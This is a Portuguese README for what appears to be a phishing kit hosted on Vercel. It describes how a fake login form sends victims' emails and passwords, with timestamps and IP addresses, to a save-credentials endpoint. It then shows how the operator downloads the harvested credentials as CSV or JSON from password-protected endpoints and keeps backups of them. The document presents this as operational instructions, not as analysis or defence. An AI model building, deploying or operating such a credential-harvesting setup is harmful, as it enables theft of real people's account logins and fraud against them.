# Como Acessar as Credenciais Salvas

Quando alguém preenche email e senha no formulário, as credenciais são **automaticamente salvas** no CSV.

## 📍 Como Funciona

1. Pessoa preenche email e senha
2. Clica em "Next"
3. Credenciais são enviadas para `/api/save-credentials`
4. Servidor salva automaticamente no CSV com:
   - Timestamp (data/hora)
   - Email
   - Senha
   - IP Address

## 🔐 Como Acessar as Credenciais

### Opção 1: Baixar CSV (Recomendado)

Acesse no navegador:
```
https://seu-projeto.vercel.app/api/download-csv?password=senha123
```

Isso vai baixar o arquivo `credentials.csv` com todas as credenciais.

### Opção 2: Ver em JSON

Acesse no navegador:
```
https://seu-projeto.vercel.app/api/get-credentials?password=senha123
```

Retorna um JSON com todas as credenciais:
```json
{
  "success": true,
  "count": 2,
  "credentials": [
    {
      "timestamp": "2024-01-15T10:30:00.000Z",
      "email": "exemplo@gmail.com",
      "password": "senha123",
      "ip": "192.168.1.1"
    }
  ],
  "lastUpdate": "2024-01-15T10:35:00.000Z"
}
```

## 🔒 Mudar a Senha de Acesso

Para mudar a senha padrão (`senha123`), configure uma variável de ambiente na Vercel:

1. Vá em **Settings** → **Environment Variables**
2. Adicione:
   - `DOWNLOAD_PASSWORD` = sua senha para download CSV
   - `ACCESS_PASSWORD` = sua senha para acesso JSON

Ou via CLI:
```bash
vercel env add DOWNLOAD_PASSWORD
vercel env add ACCESS_PASSWORD
```

## 📊 Estrutura do CSV

O arquivo CSV tem as seguintes colunas:
- **Timestamp**: Data e hora do login
- **Email**: Email digitado
- **Password**: Senha digitada
- **IP Address**: IP de origem

## ⚠️ Importante

- Na Vercel, o CSV é salvo em `/tmp` (sistema temporário)
- O arquivo persiste entre requisições, mas pode ser limpo periodicamente
- Recomenda-se fazer backup regularmente usando o endpoint de download
- Mantenha a senha de acesso segura!

## 🧪 Testar Localmente

Para testar localmente:
```bash
cd server
npm start
```

As credenciais serão salvas em `credentials.csv` na raiz do projeto.
